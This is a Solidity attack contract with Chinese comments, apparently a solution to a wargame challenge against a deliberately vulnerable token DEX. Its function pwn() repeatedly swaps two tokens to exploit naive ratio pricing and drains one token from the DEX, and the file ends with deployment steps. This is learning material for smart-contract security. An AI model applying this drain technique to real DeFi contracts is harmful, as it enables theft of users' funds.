// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Hack {
    IDex private immutable dex;
    IERC20 private immutable token1;
    IERC20 private immutable token2;

    constructor(IDex _dex) { //传入instance address
        dex = _dex;
        token1 = IERC20(dex.token1());
        token2 = IERC20(dex.token2());
    }

    function pwn() external {
        token1.transferFrom(msg.sender, address(this), 10); //将被我账户的10token转账到这个攻击合约
        token2.transferFrom(msg.sender, address(this), 10);

        token1.approve(address(dex), type(uint).max);
        token2.approve(address(dex), type(uint).max);

        _Swap(token1, token2); //call 5次swap function
        _Swap(token2, token1);
        _Swap(token1, token2);
        _Swap(token2, token1);
        _Swap(token1, token2);

        dex.swap(address(token2), address(token1), 45);
        require(token1.balanceOf(address(dex)) == 0, "dex balance != 0");
    }

    function _Swap(IERC20 tokenIn, IERC20 tokenOut) private {
        dex.swap(address(tokenIn), address(tokenOut), tokenIn.balanceOf(address(this)));
    }
}

interface IDex {
    function token1() external view returns (address);
    function token2() external view returns (address);
    function getSwapPrice(address from, address to, uint amount) external view returns(uint);
    function swap(address from, address to, uint amount) external;
}

interface IERC20 {
    function totalSupply() external view returns (uint256); //返回代币总供给
    function balanceOf(address account) external view returns (uint256); //返回特定account的代币余额
    function transfer(address to, uint256 amount) external returns (bool); //转账，如果你的账户有这个token，可以直接这么转账
    function allowance(address owner, address spender) external view returns (uint256); //返回owner账户授权给spender账户的额度，默认为0。
    function approve(address spender, uint256 amount) external returns (bool); //owner给spender授权, 这个spender可以是owner自己
    function transferFrom(address from, address to, uint256 amount) external returns (bool); //从from账户向to账户转账amount数量代币。转账的部分会从调用者的allowance中扣除。

}

//1. 传入instance address, deploy hack contract

//2. get the address of token1 and token2

//--token1: 0x6d3143c90A4246Db8F32fEaa8ea2234C19a25685
//--token2: 0xE95A8C43035fF71E0ecDa5E0B53624a0Ae3E3b05

//3. 调用IERC20， 调用approve分别给这个hack合约授权100额度的amount

//4. Call the function pwn()
